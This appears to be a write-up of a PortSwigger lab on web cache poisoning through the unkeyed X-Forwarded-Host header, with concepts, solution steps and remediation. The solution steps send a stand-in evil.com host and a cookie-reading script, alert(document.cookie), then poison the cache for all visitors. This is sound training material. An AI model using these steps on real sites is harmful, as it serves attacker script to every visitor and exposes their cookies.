# Lab 1: Web Cache Poisoning with an Unkeyed Header

**Category:** Web Cache Poisoning
**Difficulty:** Practitioner
**Lab link:** [Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

## Overview

The application uses `X-Forwarded-Host` to dynamically build a script URL in the response, but this header is not included in the cache key. By injecting a malicious value and getting it cached, every subsequent visitor who receives the cached response loads a script from the attacker's server.

## Key Concepts

- **Cache key:** the set of request components (URL, specific headers) the cache uses to identify a unique response. Headers *outside* the cache key are unkeyed — they affect the response but not the lookup.
- **Unkeyed header:** `X-Forwarded-Host` is used by the app to rewrite URLs in the response body but excluded from the cache key. Same URL → same cache entry for all users, regardless of what `X-Forwarded-Host` they send.
- **Cache poisoning:** inject a malicious value via an unkeyed header, get it cached, and every user served the cached response is affected.

## Solution

### Step 1 — Identify the unkeyed header

Add `X-Forwarded-Host: evil.com` to `GET /`. Check the response body — the value appears reflected in a script import:
```html
<script src="//evil.com/resources/js/tracking.js"></script>
```

### Step 2 — Confirm cacheability

Send the same request twice. First response: `X-Cache: miss`. Second: `X-Cache: hit`. The poisoned response is now cached.

### Step 3 — Host malicious script on exploit server

Create `/resources/js/tracking.js` on the exploit server:
```javascript
alert(document.cookie)
```

### Step 4 — Poison the cache

Send `GET /` with `X-Forwarded-Host: <exploit-server-host>` until you get `X-Cache: hit`.

### Step 5 — Verify

Visit the lab home page in a fresh browser (or incognito) without the header. The cached response loads your script. Lab solved.

## Remediation

- Include all headers that influence the response in the cache key (or strip them before caching).
- Use `Vary` response header to tell caches which request headers affect the response.
- Avoid using untrusted headers like `X-Forwarded-Host` to build URLs; use the canonical `Host` header instead.

## Key Takeaways

- If a header changes the response body but is not in the cache key, it's a cache poisoning vector.
- `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server` are common unkeyed headers to test.
- One poisoned cache entry affects every user served from that cache node until it expires.
